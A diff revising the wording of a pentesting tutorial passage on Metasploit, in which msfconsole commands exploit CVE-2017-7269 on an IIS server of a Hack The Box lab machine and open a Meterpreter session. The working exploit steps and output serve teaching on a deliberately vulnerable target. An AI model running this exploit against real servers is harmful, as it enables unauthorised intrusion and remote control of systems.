@@ -173,9 +173,9 @@ As you can notice, on this occasion we get which paths were found and which were
 ## Metasploit
 https://github.com/rapid7/metasploit-framework
 
-Metasploit is a pentesting framework created by Rapid7. It is widely used and simplifies A LOT the process of collecting information, doing a vulnerability analysis, exploiting and post-exploiting a system. I cannot recommend highly enough [Hak5's Metasploit Minute](https://www.youtube.com/watch?v=TCPyoWHy4eA&list=PL7-g2-mnZwSEFhqybJFEPZYhNFqqbCe9_) video series as it is a great learning resource for those learning Metasploit!
+Metasploit is a pentesting framework created by Rapid7. It is widely used and simplifies A LOT the process of collecting information, doing a vulnerability analysis, exploiting, and post-exploiting a system. I cannot recommend highly enough [Hak5's Metasploit Minute](https://www.youtube.com/watch?v=TCPyoWHy4eA&list=PL7-g2-mnZwSEFhqybJFEPZYhNFqqbCe9_) video series as it is a great learning resource for those learning Metasploit!
 
-This example is a bit different to the other ones as it is based on _msfconsole_, the Metasploit cli. First, let's use the _search_ command to search for modules that contain the word _iis_:
+The example in this case will a bit different to the other ones, as instead of just getting information about the system we will compromise it. The Metasploit command-line interface will be used on this occasion: _msfconsole_. First, let's use the _search_ command to search for modules that contain the word _iis_:
 ```
 msf5 > search iis
 
@@ -217,7 +217,7 @@ Matching Modules
    30  exploit/windows/ssl/ms04_011_pct                                 2004-04-13       average    No     MS04-011 Microsoft Private Communications Transport Overflow
 ```
 
-From the list of all modules related to IIS, the number 15 will be used to exploit the system and get access to it: _Microsoft IIS WebDav ScStoragePathFromUrl Overflow_, which is related to the vulnerability [CVE-2017-7269](https://www.cvedetails.com/cve/CVE-2017-7269/).
+It is possible to recognize several exploits and scanners among the Metasploit modules available for IIS servers. In this occasion the number 15 will be used to exploit the system and get access to it: _Microsoft IIS WebDav ScStoragePathFromUrl Overflow_, which is related to the vulnerability [CVE-2017-7269](https://www.cvedetails.com/cve/CVE-2017-7269/) and is also know as "Exploding Can".
 
 So now the _use_ command will be used to select the exploit from the list, and _show options_ to get the options that have to be set in order to execute the exploit:
 ```
@@ -254,19 +254,19 @@ Exploit target:
    0   Microsoft Windows Server 2003 R2 SP2 x86
 ```
 
-The only mandatory option that has to be set is __RHOSTS__, and corresponds to the target (victim) host. So let's set it to the IP address of the vulnerable-on-purpose HTB machine:
+The only mandatory option that has is still to be set is __RHOSTS__, and corresponds to the target (victim) host. So let's set it to the IP address of the same machine we scanned with the previous tools:
 ```
 msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOSTS 10.10.10.14
 RHOSTS => 10.10.10.14
 ```
 
-Another really interesting feature of Metasploit modules is that some of them they have a _check_ function to verify if the target host is vulnerable to the selected exploit:
+A really interesting feature of Metasploit modules is that some of them have a _check_ function to verify if the target host is vulnerable:
 ```
 msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > check
 [+] 10.10.10.14:80 - The target is vulnerable.
 ```
 
-As it is vulnerable, let's proceed to run the exploit to gain access to the victim:
+As the host seems to be vulnerable to this exploit, let's proceed to run it in order to get access to the server:
 ```
 msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit
 
@@ -276,8 +276,7 @@ msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit
 [*] Meterpreter session 1 opened (10.10.14.8:4444 -> 10.10.10.14:1030) at 2020-09-20 12:49:01 -0400
 ```
 
-Boom! We have open a Meterpreter session on the victim server. Let's use it to get some info about the system:
-
+Boom! We have access to the victim server!
 ```
 meterpreter > sysinfo
 Computer        : GRANPA
